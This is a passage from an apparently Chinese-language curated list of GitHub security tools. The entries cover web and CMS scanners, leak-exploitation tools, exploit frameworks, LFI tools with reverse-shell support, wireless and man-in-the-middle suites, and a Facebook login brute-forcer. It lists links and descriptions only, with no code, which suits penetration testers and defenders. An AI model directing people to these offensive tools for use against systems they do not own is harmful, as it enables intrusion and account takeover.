<strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/mozilla/ssh_scan">https://github.com/mozilla/ssh_scan</a> - <strong>服务器SSH配置信息扫描</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Ruby</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/18F/domain-scan">https://github.com/18F/domain-scan</a> - <strong>针对域名及其子域名的资产数据检测／扫描，包括http&#x2F;https检测等</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/ggusoft/inforfinder">https://github.com/ggusoft/inforfinder</a> - <strong>域名资产收集及指纹识别工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/boy-hack/gwhatweb">https://github.com/boy-hack/gwhatweb</a> - <strong>CMS识别, python gevent实现</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/Mosuan/FileScan">https://github.com/Mosuan/FileScan</a> - <strong>敏感文件扫描、二次判断降低误报率、扫描内容规则化、多目录扫描</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/Xyntax/FileSensor">https://github.com/Xyntax/FileSensor</a> - <strong>基于爬虫的动态敏感文件探测工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/deibit/cansina">https://github.com/deibit/cansina</a> - <strong>web路径扫描工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/mozilla/cipherscan">https://github.com/mozilla/cipherscan</a> - <strong>目标主机服务SSL类型识别</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x&#x2F;Bash Shell</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a> - <strong>Web应用fuzz工具、框架，同时可用于web路径、服务扫描</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x&#x2F;3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/s0md3v/Breacher">https://github.com/s0md3v/Breacher</a> - <strong>多线程的后台路径扫描器，也可用于发现Execution After Redirect漏洞f</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/ztgrace/changeme">https://github.com/ztgrace/changeme</a> - <strong>弱口令扫描器，不仅支持普通登录页，也支持ssh、mongodb等组件</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/medbenali/CyberScan">https://github.com/medbenali/CyberScan</a> - <strong>渗透测试辅助工具，支持分析数据包、解码、端口扫描、IP地址分析等</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/m0nad/HellRaiser">https://github.com/m0nad/HellRaiser</a> - <strong>基于nmap的扫描器，与cve漏洞关联</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Ruby</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/scipag/vulscan">https://github.com/scipag/vulscan</a> - <strong>基于Nmap的高级漏洞扫描器，命令行环境使用</strong></li></ul><p><strong>评分</strong>: 🌟🌟         |         <strong>编程语言</strong>: <strong>NSE</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/jekyc/wig">https://github.com/jekyc/wig</a> - <strong>Web应用信息搜集工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/eldraco/domain_analyzer">https://github.com/eldraco/domain_analyzer</a> - <strong>围绕web服务的域名进行信息收集和”域传送”等漏洞扫描，也支持针对背后的服务器端口扫描等</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/cloudtracer/paskto">https://github.com/cloudtracer/paskto</a> - <strong>基于Nikto扫描规则的被动式路径扫描以及信息爬虫</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Node.js</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/zerokeeper/WebEye">https://github.com/zerokeeper/WebEye</a> - <strong>快速识别web服务器类型、CMS类型、WAF类型、WHOIS信息、以及语言框架</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: </p><ul><li><a href="https://github.com/m3liot/shcheck">https://github.com/m3liot/shcheck</a> - <strong>用于检查web服务的http header的安全性</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/aipengjie/sensitivefilescan">https://github.com/aipengjie/sensitivefilescan</a> - <strong>一款高效快捷的敏感文件扫描工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/fnk0c/cangibrina">https://github.com/fnk0c/cangibrina</a> - <strong>通过字典穷举、google、robots.txt等途径的跨平台后台管理路径扫描器</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/n4xh4ck5/CMSsc4n">https://github.com/n4xh4ck5/CMSsc4n</a> - <strong>常规CMS指纹识别</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/Ekultek/WhatWaf">https://github.com/Ekultek/WhatWaf</a> - <strong>WAF指纹识别及自动化bypass工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/dzonerzy/goWAPT">https://github.com/dzonerzy/goWAPT</a> - <strong>Web应用fuzz工具、框架，同时可用于web路径&#x2F;服务扫描</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Go</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/blackye/webdirdig">https://github.com/blackye/webdirdig</a> - <strong>web敏感目录、信息泄漏扫描脚本</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/GitHackTools/BillCipher">https://github.com/GitHackTools/BillCipher</a> - <strong>用于网站或IP地址的信息收集工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/boy-hack/w8fuckcdn">https://github.com/boy-hack/w8fuckcdn</a> - <strong>通过扫描全网获得真实IP的自动化程序</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/boy-hack/w11scan">https://github.com/boy-hack/w11scan</a> - <strong>分布式web指纹识别平台</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/Nekmo/dirhunt">https://github.com/Nekmo/dirhunt</a> - <strong>爬虫式web目录扫描工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x&#x2F;3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/MetaChar/pyHAWK">https://github.com/MetaChar/pyHAWK</a> - <strong>数据库文件、私钥等敏感文件泄露扫描</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/H4ckForJob/dirmap">https://github.com/H4ckForJob/dirmap</a> - <strong>一个高级web目录扫描工具，功能将会强于DirBuster、Dirsearch、cansina、御剑</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/s0md3v/Photon">https://github.com/s0md3v/Photon</a> - <strong>可以提取网址，电子邮件，文件，网站帐户等的高速爬虫</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/1N3/BlackWidow">https://github.com/1N3/BlackWidow</a> - <strong>Web站点信息搜集工具，包括邮箱、电话等信息</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><h3 id="特殊组件或漏洞类型扫描"><a href="#特殊组件或漏洞类型扫描" class="headerlink" title="特殊组件或漏洞类型扫描"></a>特殊组件或漏洞类型扫描</h3><ul><li><a href="https://github.com/1N3/XSSTracer">https://github.com/1N3/XSSTracer</a>  - <strong>用于检测跨站跟踪, 点击劫持等问题的工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/0xHJK/dumpall">https://github.com/0xHJK/dumpall</a> - <strong><code>.git</code> &#x2F; <code>.svn</code> &#x2F; <code>.DS_Store</code>等信息泄露集成利用工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/shengqi158/svnhack">https://github.com/shengqi158/svnhack</a> - <strong>A <code>.svn</code> 文件夹泄露利用工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>NSE</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a> - <strong><code>.git</code> 文件夹泄露利用工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/blackye/Jenkins">https://github.com/blackye/Jenkins</a> - <strong>Jenkins漏洞探测、用户抓取爆破</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/code-scan/dzscan">https://github.com/code-scan/dzscan</a> - <strong>首款集成化的Discuz扫描工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/chuhades/CMS-Exploit-Framework">https://github.com/chuhades/CMS-Exploit-Framework</a>  -<strong>一款简洁优雅的CMS扫描及利用框架</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/lijiejie/IIS_shortname_Scanner">https://github.com/lijiejie/IIS_shortname_Scanner</a> - <strong>IIS短文件名暴力枚举漏洞利用工具</strong></li></ul><p><strong>评分</strong>: 🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/riusksk/FlashScanner">https://github.com/riusksk/FlashScanner</a> - <strong>Flash-XSS扫描</strong></li></ul><p><strong>评分</strong>: 🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a> - <strong>服务器端模板注入漏洞检测与利用工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/cr0hn/dockerscan">https://github.com/cr0hn/dockerscan</a> - <strong>Docker容器集群安全评估及利用工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/m4ll0k/WPSeku">https://github.com/m4ll0k/WPSeku</a>  - <strong>一款精简的Wordpress扫描工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/rastating/wordpress-exploit-framework">https://github.com/rastating/wordpress-exploit-framework</a> - <strong>集成化wordpress漏洞利用框架</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Ruby</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/ilmila/J2EEScan">https://github.com/ilmila/J2EEScan</a> - <strong>用于扫描J2EE应用的一款burpsuite插件</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>Java</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/riusksk/StrutScan">https://github.com/riusksk/StrutScan</a> - <strong>一款基于Perl的Strut2的历史漏洞扫描器</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/D35m0nd142/LFISuite">https://github.com/D35m0nd142/LFISuite</a> - <strong>本地文件包含漏洞利用及扫描工具，支持反弹shell</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/0x4D31/salt-scanner">https://github.com/0x4D31/salt-scanner</a> - <strong>基于Salt Open以及Vulners Linux Audit API的linux漏洞扫描器，支持与JIRA、slack平台结合使用</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/tijme/angularjs-csti-scanner">https://github.com/tijme/angularjs-csti-scanner</a> - <strong>自动化探测客户端AngularJS模板注入漏洞工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x&#x2F;3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/irsdl/IIS-ShortName-Scanner">https://github.com/irsdl/IIS-ShortName-Scanner</a> - <strong>Java编写的IIS短文件名暴力枚举漏洞利用工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/swisskyrepo/Wordpresscan">https://github.com/swisskyrepo/Wordpresscan</a> - <strong>基于WPScan以及WPSeku的优化版wordpress扫描器</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/CHYbeta/cmsPoc">https://github.com/CHYbeta/cmsPoc</a> - <strong>CMS渗透测试框架</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/3gstudent/Smbtouch-Scanner">https://github.com/3gstudent/Smbtouch-Scanner</a> - <strong>自动化扫描内网中存在的由shadow brokers泄露的ETERNAL系列漏洞</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/OsandaMalith/LFiFreak">https://github.com/OsandaMalith/LFiFreak</a> - <strong>本地文件包含漏洞利用及扫描工具，支持反弹shell</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/mak-/parameth">https://github.com/mak-/parameth</a> - <strong>用于枚举脚本的GET&#x2F;POST未知参数字段</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/Lucifer1993/struts-scan">https://github.com/Lucifer1993/struts-scan</a> - <strong>struts2漏洞全版本检测和利用工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>C#&#x2F;Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/hahwul/a2sv">https://github.com/hahwul/a2sv</a> - <strong>SSL漏洞扫描，例如心脏滴血漏洞等</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/NickstaDB/BaRMIe">https://github.com/NickstaDB/BaRMIe</a> - <strong>用于攻击爆破Java Remote Method Invocation服务的工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Java</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/RetireJS/grunt-retire">https://github.com/RetireJS/grunt-retire</a> - <strong>扫描Node.js扩展库的常见漏洞</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Node.js</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/kotobukki/BDA">https://github.com/kotobukki/BDA</a> - <strong>针对Hadoop、Spark等大数据平台的的漏洞探测工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/jagracey/Regex-DoS">https://github.com/jagracey/Regex-DoS</a> - <strong>Node.js库RegEx 拒绝服务扫描</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Node.js</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/milesrichardson/docker-onion-nmap">https://github.com/milesrichardson/docker-onion-nmap</a> - <strong>使用nmap扫描Tor网络上隐藏的”onion”服务</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Bash Shell</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/Moham3dRiahi/XAttacker">https://github.com/Moham3dRiahi/XAttacker</a> - <strong>Web CMS exploit 工具,包含针对主流 CMS 的 66 个不同的 exploits</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Perl</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a> - <strong>一个迷你的信息泄漏批量扫描脚本</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/almandin/fuxploider">https://github.com/almandin/fuxploider</a> - <strong>文件上传漏洞扫描器及利用工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/Jamalc0m/wphunter">https://github.com/Jamalc0m/wphunter</a> - <strong>Wordpress漏洞扫描器,同时也支持敏感文件泄露扫描</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>PHP</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/retirejs/retire.js">https://github.com/retirejs/retire.js</a> - <strong>检测网站依赖的Javascript库中存在的已知通用漏洞</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Node.js</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/3xp10it/xupload">https://github.com/3xp10it/xupload</a> - <strong>自动检测上传功能是否可上传webshell</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/mobrine-mob/M0B-tool">https://github.com/mobrine-mob/M0B-tool</a> - <strong>CMS指纹识别及自动化渗透测试框架</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>Perl</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/rezasp/vbscan">https://github.com/rezasp/vbscan</a> - <strong>论坛框架vBulletin黑盒漏洞扫描器</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Perl</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/MrSqar-Ye/BadMod">https://github.com/MrSqar-Ye/BadMod</a> - <strong>CMS指纹识别及自动化渗透测试框架</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>PHP</strong>         |         <strong>仍在维护</strong>: </p><ul><li><a href="https://github.com/Tuhinshubhra/CMSeeK">https://github.com/Tuhinshubhra/CMSeeK</a> - <strong>CMS漏洞检测和利用套件</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/cloudsploit/scans">https://github.com/cloudsploit/scans</a> - <strong>AWS服务器安全审计工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Node.js</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/radenvodka/SVScanner">https://github.com/radenvodka/SVScanner</a> - <strong>针对wordpress、magento、joomla等CMS的漏洞扫描器及自动利用工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>PHP</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/rezasp/joomscan">https://github.com/rezasp/joomscan</a> - <strong>OWASP旗下Joomla漏洞扫描项目</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Perl</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/6IX7ine/djangohunter">https://github.com/6IX7ine/djangohunter</a> - <strong>用于检测因错误配置导致敏感信息暴露的Django应用程序</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/vulmon/Vulmap">https://github.com/vulmon/Vulmap</a> - <strong>Linux以及Windows服务器本地漏洞扫描</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Powershell&#x2F;Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/seungsoo-lee/DELTA">https://github.com/seungsoo-lee/DELTA</a> - <strong>SDN网络安全评估及利用框架</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Java&#x2F;Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/thelinuxchoice/facebash">https://github.com/thelinuxchoice/facebash</a> - <strong>基于TOR网络的Facebook登录爆破脚本</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Bash Shell</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/cyberark/KubiScan">https://github.com/cyberark/KubiScan</a> - <strong>k8s集群错误权限配置扫描检查工具</strong></li></ul><p><strong>Rating</strong>: 🌟🌟🌟🌟        |         <strong>Language</strong>: <strong>Python 3.x</strong>         |         <strong>Ongoing[last 6 months]</strong>: ✔️</p><h3 id="无线网络漏洞评估"><a href="#无线网络漏洞评估" class="headerlink" title="无线网络漏洞评估"></a>无线网络漏洞评估</h3><ul><li><a href="https://github.com/savio-code/fern-wifi-cracker">https://github.com/savio-code/fern-wifi-cracker</a> - <strong>无线安全审计工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/P0cL4bs/WiFi-Pumpkin">https://github.com/P0cL4bs/WiFi-Pumpkin</a> - <strong>无线安全渗透测试套件</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/MisterBianco/BoopSuite">https://github.com/MisterBianco/BoopSuite</a> - <strong>无线网络审计工具，支持2-5GHZ频段</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/besimaltnok/PiFinger">https://github.com/besimaltnok/PiFinger</a> - <strong>检查WIFI是否是”大菠萝”所开放的热点，并给予网络评分</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/derv82/wifite2">https://github.com/derv82/wifite2</a> - <strong>自动化无线网络攻击工具Wifite的重构版本</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><h3 id="局域网探测"><a href="#局域网探测" class="headerlink" title="局域网探测"></a>局域网探测</h3><ul><li><a href="https://github.com/m4n3dw0lf/PytheM">https://github.com/m4n3dw0lf/PytheM</a> - <strong>支持ARP欺骗、中间人攻击等多种攻击的网络渗透测试套件</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a>  - <strong>基于BBScan via.lijiejie的本地网络扫描</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/niloofarkheirkhah/nili">https://github.com/niloofarkheirkhah/nili</a> - <strong>网络扫描，中间人攻击，协议检测与逆向</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a> - <strong>基于javascript的本地网络扫描</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Javascript</strong>         |         <strong>仍在维护</strong>: ✖️</p><h3 id="动态或静态代码审计"><a href="#动态或静态代码审计" class="headerlink" title="动态或静态代码审计"></a>动态或静态代码审计</h3><ul><li><a 